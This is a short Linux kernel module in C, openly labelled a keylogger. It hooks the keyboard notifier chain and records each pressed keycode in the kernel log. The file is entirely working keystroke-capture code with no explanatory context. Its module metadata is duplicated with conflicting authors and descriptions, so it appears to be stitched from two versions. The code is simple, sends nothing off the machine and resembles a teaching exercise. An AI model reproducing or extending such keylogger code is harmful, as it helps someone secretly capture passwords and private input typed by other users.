#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("SES");
MODULE_DESCRIPTION("Finds key pressed");

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *data) {
    struct keyboard_notifier_param *param = data;

    // Check for keycode and down event
    if (code == KBD_KEYCODE && param->down) {
        printk(KERN_INFO "Keylogger: Key %d, pressed\n", param->value);
    }
    return NOTIFY_OK;
}

// Notifier block
static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};

// Module initialization
static int __init keylogger_init(void) {
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

// Module cleanup
static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ANUPAMA");
MODULE_DESCRIPTION("Simple Linux Keylogger");
